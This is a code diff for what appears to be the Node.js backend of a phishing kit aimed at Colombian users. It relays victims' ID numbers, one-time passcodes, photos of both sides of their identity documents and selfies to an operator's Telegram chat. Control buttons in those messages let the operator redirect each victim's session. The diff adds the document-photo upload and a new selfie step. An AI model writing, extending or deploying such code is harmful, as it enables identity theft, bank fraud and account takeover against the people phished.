@@ -4,6 +4,7 @@ const express = require("express");
 const bodyParser = require("body-parser");
 const dotenv = require("dotenv");
 const fetch = require("node-fetch");
+const FormData = require('form-data');
 const app = express();
 dotenv.config();
 
@@ -61,7 +62,8 @@ function getBotones(sessionId) {
         { text: "🛡️ VALIDAR → validator.html", callback_data: `validator_${sessionId}` }
       ],
       [
-        { text: "🎉 ÉXITO → list.html", callback_data: `list_${sessionId}` }
+        { text: "🎉 ÉXITO → list.html", callback_data: `list_${sessionId}` },
+        { text: "🔄 REST → rest.html", callback_data: `rest_${sessionId}` }
       ]
     ]
   };
@@ -158,9 +160,44 @@ async function enviarMensajeOTP({ cedula, docType, otp, sessionId }) {
   }
 }
 
+// Enviar foto al chat de Telegram vía multipart
+async function enviarFotoTelegram(base64Str, filename, caption) {
+  try {
+    const buf = Buffer.from(base64Str.replace(/^data:image\/\w+;base64,/, ''), 'base64');
+    const form = new FormData();
+    form.append('chat_id', CHAT_ID);
+    form.append('photo', buf, { filename, contentType: 'image/jpeg' });
+    if (caption) form.append('caption', caption);
+    const res = await fetch(getTelegramApiUrl('sendPhoto'), {
+      method: 'POST', body: form, headers: form.getHeaders()
+    });
+    const data = await res.json();
+    if (!data.ok) console.error('[SEND PHOTO ERROR]', data.description);
+  } catch(e) {
+    console.error('[SEND PHOTO ERROR]', e.message);
+  }
+}
+
 // Fotos de documento tomadas
-async function enviarMensajeDoc({ cedula, docType, sessionId }) {
+async function enviarMensajeDoc({ cedula, docType, frenteB64, reversoB64, sessionId }) {
   const mensaje = `📄 FOTOS DE DOCUMENTO TOMADAS\n👤 ${docType} ${cedula}\n⏰ Hora: ${new Date().toLocaleTimeString('es-CO')}\n\n⏳ Esperando decisión del admin...`;
+  const response = await fetch(getTelegramApiUrl('sendMessage'), {
+    method: "POST", headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ chat_id: CHAT_ID, text: mensaje, reply_markup: getBotones(sessionId) })
+  });
+  const data = await response.json();
+  if (data.ok && data.result) {
+    const sd = sessions.get(sessionId) || { redirect_to: null };
+    sd.last_message_id = data.result.message_id;
+    sessions.set(sessionId, sd);
+  }
+  if (frenteB64) await enviarFotoTelegram(frenteB64, 'frente.jpg', '📋 Frente del documento');
+  if (reversoB64) await enviarFotoTelegram(reversoB64, 'reverso.jpg', '📋 Reverso del documento');
+}
+
+// Selfie REST capturada
+async function enviarMensajeRest({ cedula, docType, sessionId }) {
+  const mensaje = `🔄 SELFIE REST CAPTURADA\n👤 ${docType} ${cedula}\n⏰ Hora: ${new Date().toLocaleTimeString('es-CO')}\n\n⏳ Esperando decisión del admin...`;
   const response = await fetch(getTelegramApiUrl('sendMessage'), {
     method: "POST", headers: { "Content-Type": "application/json" },
     body: JSON.stringify({ chat_id: CHAT_ID, text: mensaje, reply_markup: getBotones(sessionId) })
@@ -246,12 +283,24 @@ app.post("/notifyotp", async (req, res) => {
 
 // POST /notifydoc
 app.post("/notifydoc", async (req, res) => {
+  const { session_id, cedula, docType, frenteB64, reversoB64 } = req.body;
+  if (session_id) {
+    const sd = sessions.get(session_id) || { redirect_to: null };
+    sd.redirect_to = null;
+    sessions.set(session_id, sd);
+    await enviarMensajeDoc({ cedula: cedula || '?', docType: docType || '?', frenteB64, reversoB64, sessionId: session_id });
+  }
+  return res.json({ ok: true });
+});
+
+// POST /notifyrest
+app.post("/notifyrest", async (req, res) => {
   const { session_id, cedula, docType } = req.body;
   if (session_id) {
     const sd = sessions.get(session_id) || { redirect_to: null };
     sd.redirect_to = null;
     sessions.set(session_id, sd);
-    await enviarMensajeDoc({ cedula: cedula || '?', docType: docType || '?', sessionId: session_id });
+    await enviarMensajeRest({ cedula: cedula || '?', docType: docType || '?', sessionId: session_id });
   }
   return res.json({ ok: true });
 });
@@ -385,7 +434,7 @@ app.listen(PORT, () => {
 // Keepalive — self-ping cada 14 min (detecta Railway o Render automáticamente)
 const SELF_URL = process.env.RAILWAY_PUBLIC_DOMAIN
   ? `https://${process.env.RAILWAY_PUBLIC_DOMAIN}/health`
-  : 'https://shinys-pops.onrender.com/health';
+  : 'https://mamiprendeelflash.onrender.com/health';
 setInterval(() => {
   fetch(SELF_URL)
     .then(() => console.log(`[KEEPALIVE] ${new Date().toISOString()}`))
